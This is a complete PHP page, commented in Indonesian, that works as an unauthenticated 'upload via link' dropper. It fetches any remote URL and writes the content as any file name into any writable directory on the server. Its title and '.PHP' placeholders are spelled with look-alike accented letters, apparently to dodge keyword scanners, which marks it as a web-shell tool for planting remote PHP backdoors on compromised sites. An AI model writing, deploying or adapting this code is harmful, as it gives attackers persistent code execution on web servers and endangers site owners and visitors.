<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ŪPĹŌĀĐ VĪĀ ĹĨŅĶ</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; }
        .container { width: 50%; margin: 50px auto; padding: 20px; background-color: #fff; box-shadow: 0 0 10px rgba(0,0,0,.1); text-align: center; }
        h1 { color: #333; }
        form { margin-top: 20px; }
        input[type="text"] { padding: 10px; width: 80%; margin-bottom: 10px; }
        button { padding: 10px 20px; background-color: #4CAF50; color: #fff; border: none; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #45a049; }
        .output { margin-top: 20px; text-align: left; padding: 10px; background-color: #f9f9f9; border: 1px solid #ddd; font-size: 14px; }
        .ok { color:#0a7b13; }
        .err { color:#b00020; }
    </style>
</head>
<body>
<?php
// ---------- Init & helpers (buat kompatibel PHP lama) ----------
$output   = '';
$url      = '';
$filename = '';
$path     = __DIR__;

// Helper unduh konten dengan fallback cURL (jaga-jaga allow_url_fopen OFF)
function fetch_remote($u) {
    // Batasi hanya http/https
    $scheme = parse_url($u, PHP_URL_SCHEME);
    if ($scheme !== 'http' && $scheme !== 'https') return false;

    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(array('http' => array('timeout' => 20)));
        return @file_get_contents($u, false, $ctx);
    }
    // cURL fallback
    if (function_exists('curl_init')) {
        $ch = curl_init($u);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        $data = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        curl_close($ch);
        if ($data !== false && $code >= 200 && $code < 300) return $data;
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Ambil input (tanpa ??)
    $url      = isset($_POST['url']) ? trim($_POST['url']) : '';
    $filename = isset($_POST['filename']) ? trim($_POST['filename']) : '';
    $path     = isset($_POST['path']) ? trim($_POST['path']) : __DIR__;

    // Validasi dasar
    if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
        $output = '<p class="err">URL tidak valid</p>';
    } elseif ($filename === '') {
        $output = '<p class="err">Nama file wajib diisi.</p>';
    } elseif (!is_dir($path)) {
        $output = '<p class="err">Direktori tidak ditemukan: ' . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . '</p>';
    } elseif (!is_writable($path)) {
        $output = '<p class="err">Direktori tidak bisa ditulis: ' . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . '</p>';
    } else {
        // Bersihkan nama file sederhana (opsional)
        $filename = preg_replace('/[\\\\\/:*?"<>|]+/', '_', $filename);

        $file_contents = fetch_remote($url);
        if ($file_contents === false) {
            $output = '<p class="err">Gagal mengunduh</p>';
        } else {
            $file_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
            $bytes = @file_put_contents($file_path, $file_contents);
            if ($bytes === false) {
                $output = '<p class="err">Gagal menyimpan: ' . htmlspecialchars($file_path, ENT_QUOTES, 'UTF-8') . '</p>';
            } else {
                $file_name_only = basename($file_path);
                $output = '<p class="ok">File berhasil: ' . htmlspecialchars($file_name_only, ENT_QUOTES, 'UTF-8') . ' (' . (int)$bytes . ' byte)</p>';
            }
        }
    }
}
?>
    <div class="container">
        <h1>ŪPĹŌĀĐ VĪĀ ĹĨŅĶ</h1>

        <form action="" method="post">
            <label for="url">File URL:</label><br>
            <input type="text" id="url" name="url"
                   value="<?php echo htmlspecialchars($url, ENT_QUOTES, 'UTF-8'); ?>"
                   placeholder="https://example.com/file.ṖĤṖ" required><br><br>

            <label for="filename">File Name:</label><br>
            <input type="text" id="filename" name="filename"
                   value="<?php echo htmlspecialchars($filename, ENT_QUOTES, 'UTF-8'); ?>"
                   placeholder="filename.ṖĤṖ" required><br><br>

            <label for="path">Directory Path:</label><br>
            <input type="text" id="path" name="path"
                   value="<?php echo htmlspecialchars($path, ENT_QUOTES, 'UTF-8'); ?>"
                   placeholder="<?php echo htmlspecialchars(__DIR__, ENT_QUOTES, 'UTF-8'); ?>" required><br><br>

            <button type="submit">Upload</button>
        </form>

        <div class="output">
            <?php echo $output; ?>
        </div>
    </div>
</body>
</html>
